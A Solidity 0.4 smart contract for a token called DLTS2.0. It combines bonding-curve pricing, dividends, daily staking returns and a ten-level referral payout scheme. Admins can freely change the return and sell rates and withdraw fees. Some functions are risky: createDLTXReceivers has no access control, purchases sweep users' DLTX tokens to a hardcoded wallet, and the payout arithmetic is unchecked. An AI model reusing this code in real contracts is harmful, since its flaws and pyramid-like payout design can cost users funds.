1 pragma solidity ^0.4.20;
2 
3  /**
4  * @title SafeMath
5  * @dev Math operations with safety checks that throw on error
6  */
7 library SafeMath {
8     function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {
9         uint _numerator  = numerator * 10 ** (precision+1);
10         uint _quotient =  ((_numerator / denominator) + 5) / 10;
11         return (value*_quotient/1000000000000000000);
12     }
13     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
14         if (a == 0) {
15             return 0;
16         }
17         uint256 c = a * b;
18         assert(c / a == b);
19         return c;
20     }
21     function div(uint256 a, uint256 b) internal pure returns (uint256) {
22         // assert(b > 0); // Solidity automatically throws when dividing by 0
23         uint256 c = a / b;
24         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
25         return c;
26     }
27     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28         assert(b <= a);
29         return a - b;
30     }
31     function add(uint256 a, uint256 b) internal pure returns (uint256) {
32         uint256 c = a + b;
33         assert(c >= a);
34         return c;
35     }
36 }
37 
38 contract ERC20 {
39     function totalSupply() public constant returns (uint);
40     function balanceOf(address tokenOwner) public constant returns (uint balance);
41     function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
42     function transfer(address to, uint tokens) public returns (bool success);
43     function approve(address spender, uint tokens) public returns (bool success);
44     function transferFrom(address from, address to, uint tokens) public returns (bool success);
45     event Transfer(address indexed from, address indexed to, uint tokens);
46     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
47 }
48 
49 contract Receiver {
50     function sendFundsTo(address tracker, uint256 amount, address receiver) public returns (bool) {
51         return ERC20(tracker).transfer(receiver, amount);
52     }
53 }
54 
55 contract DLTS {
56     
57     /*=====================================
58     =            CONFIGURABLES            =
59     =====================================*/
60     
61     string public name                                      = "DLTS2.0";
62     string public symbol                                    = "DLTS";
63     uint8 constant public decimals                          = 18;
64     uint8 constant internal dividendFee_                    = 5;
65     uint8 constant internal referralPer_                    = 20;
66     uint8 constant internal developerFee_                   = 5;
67    
68 	uint256 internal stakePer_                              = 250000000000000000;
69 	uint256 internal sellPer_                               = 5000000000000000000;
70     uint256 constant internal tokenPriceInitial_            = 0.0025 ether;
71     uint256 constant internal tokenPriceIncremental_        = 0.0000001 ether;
72     uint256 constant internal tokenPriceDecremental_        = 0.00000015 ether;
73     uint256 constant internal dltxPrice_                    = 0.004 ether;
74     uint256 constant internal magnitude                     = 2**64;
75     
76    
77     uint256 public stakingRequirement                       = 1e18;
78     
79     // Ambassador program
80     mapping(address => bool) internal ambassadors_;
81     uint256 constant internal ambassadorMaxPurchase_        = 1 ether;
82     uint256 constant internal ambassadorQuota_              = 1 ether;
83     
84    /*================================
85     =            DATASETS            =
86     ================================*/
87     
88     mapping(address => uint256) internal tokenBalanceLedger_;
89     mapping(address => uint256) internal stakeBalanceLedger_;
90     mapping(address => uint256) internal stakingTime_;
91     mapping(address => uint256) internal sellTime_;
92     mapping(address => uint256) internal referralBalance_;
93     mapping(address => uint256) public DLTXbuying_;
94     mapping(address => uint256) public DLTXbuyingETHamt_;
95     mapping(address => address) public receiversMap;
96     
97     mapping(address => address) internal referralLevel1Address;
98     mapping(address => address) internal referralLevel2Address;
99     mapping(address => address) internal referralLevel3Address;
100     mapping(address => address) internal referralLevel4Address;
101     mapping(address => address) internal referralLevel5Address;
102     mapping(address => address) internal referralLevel6Address;
103     mapping(address => address) internal referralLevel7Address;
104     mapping(address => address) internal referralLevel8Address;
105     mapping(address => address) internal referralLevel9Address;
106     mapping(address => address) internal referralLevel10Address;
107     
108     mapping(address => int256) internal payoutsTo_;
109     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
110     uint256 internal tokenSupply_                           = 0;
111     uint256 internal developerBalance                       = 0;
112    
113     uint256 internal profitPerShare_;
114     
115   
116     mapping(bytes32 => bool) public administrators;
117     
118     bool public onlyAmbassadors = false;
119     
120     /*=================================
121     =            MODIFIERS            =
122     =================================*/
123     
124      // Only people with tokens
125     modifier onlybelievers () {
126         require(myTokens() > 0);
127         _;
128     }
129     
130     // Only people with profits
131     modifier onlyhodler() {
132         require(myDividends(true) > 0);
133         _;
134     }
135     
136     // Only admin
137     modifier onlyAdministrator(){
138         address _customerAddress = msg.sender;
139         require(administrators[keccak256(_customerAddress)]);
140         _;
141     }
142 	 
143     
144     modifier antiEarlyWhale(uint256 _amountOfEthereum){
145         address _customerAddress = msg.sender;
146         if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
147             require(
148                 // is the customer in the ambassador list?
149                 ambassadors_[_customerAddress] == true &&
150                 // does the customer purchase exceed the max ambassador quota?
151                 (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
152             );
153             // updated the accumulated quota    
154             ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
155             _;
156         } else {
157             // in case the ether count drops low, the ambassador phase won't reinitiate
158             onlyAmbassadors = false;
159             _;    
160         }
161     }
162     
163     /*==============================
164     =            EVENTS            =
165     ==============================*/
166     
167     event onTokenPurchase(
168         address indexed customerAddress,
169         uint256 incomingEthereum,
170         uint256 tokensMinted,
171         address indexed referredBy
172     );
173     
174     event onTokenSell(
175         address indexed customerAddress,
176         uint256 tokensBurned,
177         uint256 ethereumEarned
178     );
179     
180     event onReinvestment(
181         address indexed customerAddress,
182         uint256 ethereumReinvested,
183         uint256 tokensMinted
184     );
185     
186     event onWithdraw(
187         address indexed customerAddress,
188         uint256 ethereumWithdrawn
189     );
190     
191     event Transfer(
192         address indexed from,
193         address indexed to,
194         uint256 tokens
195     );
196     
197     /*=======================================
198     =            PUBLIC FUNCTIONS            =
199     =======================================*/
200     /*
201     * -- APPLICATION ENTRY POINTS --  
202     */
203     function DLTS() public {
204         // add administrators here
205         administrators[0x444dab79bea484e63b43f800cdc20827aa809c843c419350c3263082287a9e27] = true;
206         
207         ambassadors_[0x0000000000000000000000000000000000000000] = true;
208     }
209      
210     /**
211      * BUY
212      */
213     function buy(address _referredBy) public payable returns(uint256) {
214         purchaseTokens(msg.value, _referredBy);
215     }
216     
217     function() payable public {
218         purchaseTokens(msg.value, 0x0);
219     }
220     
221     /**
222      * REINVEST
223      */
224     function reinvest() onlyhodler() public {
225         
226         uint256 _dividends                  = myDividends(false); // retrieve ref. bonus later in the code
227         
228         address _customerAddress            = msg.sender;
229         payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
230         
231         _dividends                          += referralBalance_[_customerAddress];
232         referralBalance_[_customerAddress]  = 0;
233         
234         uint256 _tokens                     = purchaseTokens(_dividends, 0x0);
235         // fire event
236         onReinvestment(_customerAddress, _dividends, _tokens);
237     }
238     
239     /**
240      * EXIT
241      */
242     function exit() public {
243         
244         address _customerAddress            = msg.sender;
245         uint256 _tokens                     = tokenBalanceLedger_[_customerAddress];
246         if(_tokens > 0) sell();
247         withdraw();
248     }
249 
250     /**
251      * WITHDRAW
252      */
253     function withdraw() onlyhodler() public {
254         
255         address _customerAddress            = msg.sender;
256         uint256 _dividends                  = myDividends(false); // get ref. bonus later in the code
257         
258         payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
259         
260         _dividends                          += referralBalance_[_customerAddress];
261         referralBalance_[_customerAddress]  = 0;
262         
263         _customerAddress.transfer(_dividends);
264         // fire event
265         onWithdraw(_customerAddress, _dividends);
266     }
267     
268     /**
269      * SELL
270      */
271     function sell() onlybelievers () public {
272         address _customerAddress                = msg.sender;
273 		uint8  sellFee_	                    	=1;
274 		
275 		  uint256 timediff                      = SafeMath.sub(now, sellTime_[_customerAddress]);
276 	        if (timediff >= 86400){
277 				uint256 _amountOfTokens 			= tokenBalanceLedger_[_customerAddress];
278 				require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
279 				uint256 _tokenstosell               = SafeMath.percent(_amountOfTokens,sellPer_,100,18);
280 				uint256 _tokens                     = _tokenstosell/1e18;
281 				uint256 _ethereum                   = tokensToEthereum_(_tokens);
282 				uint256 _dividends                  = SafeMath.percent(_ethereum,sellFee_,100,18);
283 				uint256 _taxedEthereum              = SafeMath.sub(_ethereum, _dividends);
284 				// burn the sold tokens
285 				tokenSupply_                        = SafeMath.sub(tokenSupply_, _tokens);
286 				tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
287 				// update dividends tracker
288 				int256 _updatedPayouts              = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
289 				payoutsTo_[_customerAddress]        -= _updatedPayouts;       
290 				// dividing by zero is a bad idea
291 				if (tokenSupply_ > 0) {
292 					// update the amount of dividends per token
293 					profitPerShare_                 = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
294 				}
295 				sellTime_[_customerAddress] = now;
296 				// fire event
297 				onTokenSell(_customerAddress, _tokens, _taxedEthereum);
298 			
299 	        }
300 	
301     }
302     
303     /**
304      * TRANSFER
305      */
306     function transfer(address _toAddress, uint256 _amountOfTokens) onlybelievers () public returns(bool) {
307         address _customerAddress            = msg.sender;
308         
309         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
310         
311         if(myDividends(true) > 0) withdraw();
312        
313        
314         uint256 _taxedTokens                = _amountOfTokens;
315         uint256 _dividends                  = myDividends(false);
316         
317         tokenSupply_                        = tokenSupply_;
318         
319         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
320         tokenBalanceLedger_[_toAddress]     = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
321        
322         payoutsTo_[_customerAddress]        -= (int256) (profitPerShare_ * _amountOfTokens);
323         payoutsTo_[_toAddress]              += (int256) (profitPerShare_ * _taxedTokens);
324        
325         profitPerShare_                     = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
326        
327         Transfer(_customerAddress, _toAddress, _taxedTokens);
328         return true;
329     }
330     
331     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
332     
333     function disableInitialStage() onlyAdministrator() public {
334         onlyAmbassadors                     = false;
335     }
336     
337      function changeStakePercent(uint256 stakePercent) onlyAdministrator() public {
338         stakePer_                           = stakePercent;
339     }
340 	 
341      function changeSellPercent(uint256 sellPercent) onlyAdministrator() public {
342         sellPer_                           = sellPercent;
343     }
344     
345     function setAdministrator(bytes32 _identifier, bool _status) onlyAdministrator() public {
346         administrators[_identifier]         = _status;
347     }
348     
349     function setStakingRequirement(uint256 _amountOfTokens) onlyAdministrator() public {
350         stakingRequirement                  = _amountOfTokens;
351     }
352     
353     function setName(string _name) onlyAdministrator() public {
354         name                                = _name;
355     }
356     
357     function setSymbol(string _symbol) onlyAdministrator() public {
358         symbol                              = _symbol;
359     }
360     
361       
362     function withdrawDeveloperFees(uint256 _withdrawAmount) external onlyAdministrator {
363         address _adminAddress   = msg.sender;
364         require(developerBalance >= _withdrawAmount);
365         _adminAddress.transfer(_withdrawAmount);
366         developerBalance        = SafeMath.sub(developerBalance, _withdrawAmount);
367 		
368 		
369     }
370 	
371 	
372     
373     /*---------- CALCULATORS  ----------*/
374     
375     function totalEthereumBalance() public view returns(uint) {
376         return this.balance;
377     }
378    
379     function totalDeveloperBalance() public view returns(uint) {
380         return developerBalance;
381     }
382    
383 	
384     
385     function totalSupply() public view returns(uint256) {
386         return tokenSupply_;
387     }
388     
389     
390     function myTokens() public view returns(uint256) {
391         address _customerAddress            = msg.sender;
392         return balanceOf(_customerAddress);
393     }
394     
395     
396     function myDividends(bool _includeReferralBonus) public view returns(uint256) {
397         address _customerAddress            = msg.sender;
398         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
399     }
400     
401    
402     function balanceOf(address _customerAddress) view public returns(uint256) {
403         return tokenBalanceLedger_[_customerAddress];
404     }
405 	
406 
407     function dividendsOf(address _customerAddress) view public returns(uint256) {
408         return (uint256) ((int256)(profitPerShare_ * (tokenBalanceLedger_[_customerAddress] + stakeBalanceLedger_[_customerAddress])) - payoutsTo_[_customerAddress]) / magnitude;
409     }
410     
411    
412     function sellPrice() public view returns(uint256) {
413         if(tokenSupply_ == 0){
414             return tokenPriceInitial_       - tokenPriceDecremental_;
415         } else {
416             uint256 _ethereum               = tokensToEthereum_(1e18);
417             uint256 _taxedEthereum          = _ethereum;
418             return _taxedEthereum;
419         }
420     }
421     
422    
423     function buyPrice() public view returns(uint256) {
424         if(tokenSupply_ == 0){
425             return tokenPriceInitial_       + tokenPriceIncremental_;
426         } else {
427             uint256 _ethereum               = tokensToEthereum_(1e18);
428             uint256 untotalDeduct           = developerFee_ + referralPer_ + dividendFee_ ;
429             uint256 totalDeduct             = SafeMath.percent(_ethereum,untotalDeduct,100,18);
430             uint256 _taxedEthereum          = SafeMath.add(_ethereum, totalDeduct);
431             return _taxedEthereum;
432         }
433     }
434    
435     function calculateTokensReceived(uint256 _ethereumToSpend) public view returns(uint256) {
436         uint256 untotalDeduct               = developerFee_ + referralPer_ + dividendFee_ ;
437         uint256 totalDeduct                 = SafeMath.percent(_ethereumToSpend,untotalDeduct,100,18);
438         uint256 _taxedEthereum              = SafeMath.sub(_ethereumToSpend, totalDeduct);
439         uint256 _amountOfTokens             = ethereumToTokens_(_taxedEthereum);
440         return _amountOfTokens;
441     }
442    
443     function calculateEthereumReceived(uint256 _tokensToSell) public view returns(uint256) {
444         require(_tokensToSell <= tokenSupply_);
445         uint256 _ethereum                   = tokensToEthereum_(_tokensToSell);
446         uint256 _taxedEthereum              = _ethereum;
447         return _taxedEthereum;
448     }
449     
450     function stakeTokens(uint256 _amountOfTokens) onlybelievers () public returns(bool){
451         address _customerAddress            = msg.sender;
452       
453         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
454         uint256 _amountOfTokensWith1Token   = SafeMath.sub(_amountOfTokens, 1e18);
455         stakingTime_[_customerAddress]      = now;
456         stakeBalanceLedger_[_customerAddress] = SafeMath.add(stakeBalanceLedger_[_customerAddress], _amountOfTokensWith1Token);
457         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokensWith1Token);
458     }
459     
460     
461     function stakeTokensBalance(address _customerAddress) public view returns(uint256){
462        uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
463         uint256 dayscount                   = SafeMath.div(timediff, 86400); //86400 Sec for 1 Day
464         uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
465         uint256 roiTokens                   = SafeMath.percent(stakeBalanceLedger_[_customerAddress],roiPercent,100,18);
466         uint256 finalBalance                = SafeMath.add(stakeBalanceLedger_[_customerAddress],roiTokens/1e18);
467         return finalBalance;
468     }
469     
470     function stakeTokensTime(address _customerAddress) public view returns(uint256){
471         return stakingTime_[_customerAddress];
472     }
473 	
474 	function sellTime(address _customerAddress) public view returns(uint256){
475         return sellTime_[_customerAddress];
476     }
477 	
478 	function sellTokenlimit() public view returns(uint256){
479         return sellPer_;
480     }
481     
482     function releaseStake() onlybelievers () public returns(bool){
483        
484          address _customerAddress            = msg.sender;
485     
486         require(!onlyAmbassadors && stakingTime_[_customerAddress] > 0);
487         uint256 _amountOfTokens             = stakeBalanceLedger_[_customerAddress];
488         uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
489         uint256 dayscount                   = SafeMath.div(timediff, 86400);
490         uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
491         uint256 roiTokens                   = SafeMath.percent(_amountOfTokens,roiPercent,100,18);
492         uint256 finalBalance                = SafeMath.add(_amountOfTokens,roiTokens/1e18);
493         
494     
495         tokenSupply_                        = SafeMath.add(tokenSupply_, roiTokens/1e18);
496     
497         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], finalBalance);
498         stakeBalanceLedger_[_customerAddress] = 0;
499         stakingTime_[_customerAddress]      = 0;
500         
501     }
502     
503     /*==========================================
504     =            INTERNAL FUNCTIONS            =
505     ==========================================*/
506     
507     uint256 developerFee;
508     
509     uint256 incETH;
510     address _refAddress; 
511     uint256 _referralBonus;
512     
513     uint256 bonusLv1;
514     uint256 bonusLv2;
515     uint256 bonusLv3;
516     uint256 bonusLv4;
517     uint256 bonusLv5;
518     uint256 bonusLv6;
519     uint256 bonusLv7;
520     uint256 bonusLv8;
521     uint256 bonusLv9;
522     uint256 bonusLv10;
523     
524     uint256 DLTXtoETH;
525     uint256 DLTXbalance;
526     
527     address chkLv2;
528     address chkLv3;
529     address chkLv4;
530     address chkLv5;
531     address chkLv6;
532     address chkLv7;
533     address chkLv8;
534     address chkLv9;
535     address chkLv10;
536     
537     struct RefUserDetail {
538         address refUserAddress;
539         uint256 refLevel;
540     }
541 
542     mapping(address => mapping (uint => RefUserDetail)) public RefUser;
543     mapping(address => uint256) public referralCount_;
544     
545     function getDownlineRef(address senderAddress, uint dataId) external view returns (address,uint) { 
546         return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
547     }
548     
549     function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
550         referralCount_[senderAddress]++;
551         uint dataId = referralCount_[senderAddress];
552         RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
553         RefUser[senderAddress][dataId].refLevel = refLevel;
554     }
555 
556     function getref(address _customerAddress, uint _level) public view returns(address lv) {
557         if(_level == 1) {
558             lv = referralLevel1Address[_customerAddress];
559         } else if(_level == 2) {
560             lv = referralLevel2Address[_customerAddress];
561         } else if(_level == 3) {
562             lv = referralLevel3Address[_customerAddress];
563         } else if(_level == 4) {
564             lv = referralLevel4Address[_customerAddress];
565         } else if(_level == 5) {
566             lv = referralLevel5Address[_customerAddress];
567         } else if(_level == 6) {
568             lv = referralLevel6Address[_customerAddress];
569         } else if(_level == 7) {
570             lv = referralLevel7Address[_customerAddress];
571         } else if(_level == 8) {
572             lv = referralLevel8Address[_customerAddress];
573         } else if(_level == 9) {
574             lv = referralLevel9Address[_customerAddress];
575         } else if(_level == 10) {
576             lv = referralLevel10Address[_customerAddress];
577         }
578 		
579         return lv;
580     }
581     
582     function distributeRefBonus(uint256 _incomingEthereum, address _referredBy, address _sender, bool _newReferral) internal {
583         address _customerAddress        = _sender;
584         uint256 remainingRefBonus       = _incomingEthereum;
585         _referralBonus                  = _incomingEthereum;
586         
587         bonusLv1                        = SafeMath.percent(_referralBonus,30,100,18);
588         bonusLv2                        = SafeMath.percent(_referralBonus,20,100,18);
589         bonusLv3                        = SafeMath.percent(_referralBonus,10,100,18);
590         bonusLv4                        = SafeMath.percent(_referralBonus,5,100,18);
591         bonusLv5                        = SafeMath.percent(_referralBonus,3,100,18);
592         bonusLv6                        = SafeMath.percent(_referralBonus,2,100,18);
593         bonusLv7                        = SafeMath.percent(_referralBonus,2,100,18);
594         bonusLv8                        = SafeMath.percent(_referralBonus,2,100,18);
595         bonusLv9                        = SafeMath.percent(_referralBonus,1,100,18);
596         bonusLv10                       = SafeMath.percent(_referralBonus,1,100,18);
597         
598       
599         referralLevel1Address[_customerAddress]                     = _referredBy;
600         referralBalance_[referralLevel1Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel1Address[_customerAddress]], bonusLv1);
601         remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv1);
602         if(_newReferral == true) {
603             addDownlineRef(_referredBy, _customerAddress, 1);
604         }
605         
606         chkLv2                          = referralLevel1Address[_referredBy];
607         chkLv3                          = referralLevel2Address[_referredBy];
608         chkLv4                          = referralLevel3Address[_referredBy];
609         chkLv5                          = referralLevel4Address[_referredBy];
610         chkLv6                          = referralLevel5Address[_referredBy];
611         chkLv7                          = referralLevel6Address[_referredBy];
612         chkLv8                          = referralLevel7Address[_referredBy];
613         chkLv9                          = referralLevel8Address[_referredBy];
614         chkLv10                         = referralLevel9Address[_referredBy];
615         
616       
617         if(chkLv2 != 0x0000000000000000000000000000000000000000) {
618             referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
619             referralBalance_[referralLevel2Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel2Address[_customerAddress]], bonusLv2);
620             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv2);
621             if(_newReferral == true) {
622                 addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
623             }
624         }
625         
626       
627         if(chkLv3 != 0x0000000000000000000000000000000000000000) {
628             referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
629             referralBalance_[referralLevel3Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel3Address[_customerAddress]], bonusLv3);
630             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv3);
631             if(_newReferral == true) {
632                 addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
633             }
634         }
635         
636       
637         if(chkLv4 != 0x0000000000000000000000000000000000000000) {
638             referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
639             referralBalance_[referralLevel4Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel4Address[_customerAddress]], bonusLv4);
640             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv4);
641             if(_newReferral == true) {
642                 addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
643             }
644         }
645         
646       
647         if(chkLv5 != 0x0000000000000000000000000000000000000000) {
648             referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
649             referralBalance_[referralLevel5Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel5Address[_customerAddress]], bonusLv5);
650             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv5);
651             if(_newReferral == true) {
652                 addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
653             }
654         }
655         
656       
657         if(chkLv6 != 0x0000000000000000000000000000000000000000) {
658             referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
659             referralBalance_[referralLevel6Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel6Address[_customerAddress]], bonusLv6);
660             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv6);
661             if(_newReferral == true) {
662                 addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
663             }
664         }
665         
666         
667         if(chkLv7 != 0x0000000000000000000000000000000000000000) {
668             referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
669             referralBalance_[referralLevel7Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel7Address[_customerAddress]], bonusLv7);
670             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv7);
671             if(_newReferral == true) {
672                 addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
673             }
674         }
675         
676         
677         if(chkLv8 != 0x0000000000000000000000000000000000000000) {
678             referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
679             referralBalance_[referralLevel8Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel8Address[_customerAddress]], bonusLv8);
680             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv8);
681             if(_newReferral == true) {
682                 addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
683             }
684         }
685         
686         
687         if(chkLv9 != 0x0000000000000000000000000000000000000000) {
688             referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
689             referralBalance_[referralLevel9Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel9Address[_customerAddress]], bonusLv9);
690             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv9);
691             if(_newReferral == true) {
692                 addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
693             }
694         }
695         
696        
697         if(chkLv10 != 0x0000000000000000000000000000000000000000) {
698             referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
699             referralBalance_[referralLevel10Address[_customerAddress]]  = SafeMath.add(referralBalance_[referralLevel10Address[_customerAddress]], bonusLv10);
700             remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv10);
701             if(_newReferral == true) {
702                 addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
703             }
704         }
705         
706         developerBalance                    = SafeMath.add(developerBalance, remainingRefBonus);
707     }
708 
709 
710     function createDLTXReceivers(address _customerAddress, uint256 _DLTXamt, uint256 _DLTXETHamt) public returns(address){
711             DLTXbuying_[_customerAddress] = _DLTXamt;
712             DLTXbuyingETHamt_[_customerAddress] = _DLTXETHamt;
713             if(receiversMap[_customerAddress] == 0x0000000000000000000000000000000000000000) {
714                 receiversMap[_customerAddress] = new Receiver();
715             }
716             return receiversMap[_customerAddress];
717     }
718     
719     function showDLTXReceivers(address _customerAddress) public view returns(address){
720             return receiversMap[_customerAddress];
721     }
722     
723     function showDLTXBalance(address tracker, address _customerAddress) public view returns(uint256){
724             return ERC20(0x0435316b3ab4b999856085c98c3b1ab21d85cd4d).balanceOf(receiversMap[_customerAddress]);
725     }
726     
727     function purchaseTokens(uint256 _incomingEthereum, address _referredBy) antiEarlyWhale(_incomingEthereum) internal returns(uint256) {
728         
729         address _customerAddress            = msg.sender;
730         incETH                              = _incomingEthereum;
731         
732         if(DLTXbuying_[_customerAddress] > 0) {
733             DLTXbalance = ERC20(0x0435316b3ab4b999856085c98c3b1ab21d85cd4d).balanceOf(receiversMap[_customerAddress]);
734             require(DLTXbalance >= DLTXbuying_[_customerAddress]);
735             require(incETH >= DLTXbuyingETHamt_[_customerAddress]);
736             DLTXtoETH                       = (DLTXbuying_[_customerAddress]/10**18) * dltxPrice_;
737             incETH                          = SafeMath.add(incETH, DLTXtoETH);
738             
739             Receiver(receiversMap[_customerAddress]).sendFundsTo(0x0435316b3ab4b999856085c98c3b1ab21d85cd4d, DLTXbalance, 0x5dfF6644254223bCF27086719B899c3b1Ff08943);
740             
741             DLTXbuying_[_customerAddress] = 0;
742             DLTXbuyingETHamt_[_customerAddress] = 0;
743         }
744        
745         developerFee                        = SafeMath.percent(incETH,developerFee_,100,18);
746         developerBalance                    = SafeMath.add(developerBalance, developerFee);
747         
748 		
749         
750         _referralBonus                      = SafeMath.percent(incETH,referralPer_,100,18);
751         
752         uint256 _dividends                  = SafeMath.percent(incETH,dividendFee_,100,18);
753         
754         uint256 untotalDeduct               = developerFee_ + referralPer_ + dividendFee_;
755         uint256 totalDeduct                 = SafeMath.percent(incETH,untotalDeduct,100,18);
756         
757         uint256 _taxedEthereum              = SafeMath.sub(incETH, totalDeduct);
758         uint256 _amountOfTokens             = ethereumToTokens_(_taxedEthereum);
759         uint256 _fee                        = _dividends * magnitude;
760         bool    _newReferral                = true;
761         if(referralLevel1Address[_customerAddress] != 0x0000000000000000000000000000000000000000) {
762             _referredBy                     = referralLevel1Address[_customerAddress];
763             _newReferral                    = false;
764         }
765         
766         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
767         
768         if(
769            
770             _referredBy != 0x0000000000000000000000000000000000000000 &&
771            
772             _referredBy != _customerAddress &&
773             tokenBalanceLedger_[_referredBy] >= stakingRequirement
774         ){
775             
776             distributeRefBonus(_referralBonus,_referredBy,_customerAddress,_newReferral);
777         } else {
778            
779             developerBalance                = SafeMath.add(developerBalance, _referralBonus);
780         }
781        
782         if(tokenSupply_ > 0){
783            
784             tokenSupply_                    = SafeMath.add(tokenSupply_, _amountOfTokens);
785            
786             profitPerShare_                 += (_dividends * magnitude / (tokenSupply_));
787             
788             _fee                            = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
789         } else {
790             
791             tokenSupply_                    = _amountOfTokens;
792         }
793         
794         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
795         int256 _updatedPayouts              = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
796         payoutsTo_[_customerAddress]        += _updatedPayouts;
797        
798         onTokenPurchase(_customerAddress, incETH, _amountOfTokens, _referredBy);
799         return _amountOfTokens;
800     }
801 
802    
803     function ethereumToTokens_(uint256 _ethereum) internal view returns(uint256) {
804         uint256 _tokenPriceInitial          = tokenPriceInitial_ * 1e18;
805         uint256 _tokensReceived             = 
806          (
807             (
808                 SafeMath.sub(
809                     (sqrt
810                         (
811                             (_tokenPriceInitial**2)
812                             +
813                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
814                             +
815                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
816                             +
817                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
818                         )
819                     ), _tokenPriceInitial
820                 )
821             )/(tokenPriceIncremental_)
822         )-(tokenSupply_)
823         ;
824 
825         return _tokensReceived;
826     }
827     
828     
829      function tokensToEthereum_(uint256 _tokens) internal view returns(uint256) {
830         uint256 tokens_                     = (_tokens + 15e17);
831         uint256 _tokenSupply                = (tokenSupply_ + 15e17);
832         uint256 _etherReceived              =
833         (
834             SafeMath.sub(
835                 (
836                     (
837                         (
838                             tokenPriceInitial_ +(tokenPriceDecremental_ * (_tokenSupply/15e17))
839                         )-tokenPriceDecremental_
840                     )*(tokens_ - 15e17)
841                 ),(tokenPriceDecremental_*((tokens_**2-tokens_)/15e17))/2
842             )
843         /15e17);
844         return _etherReceived;
845     }
846 	    
847     function sqrt(uint x) internal pure returns (uint y) {
848         uint z = (x + 1) / 2;
849         y = x;
850         while (z < y) {
851             y = z;
852             z = (x / z + z) / 2;
853         }
854     }
855     
856 }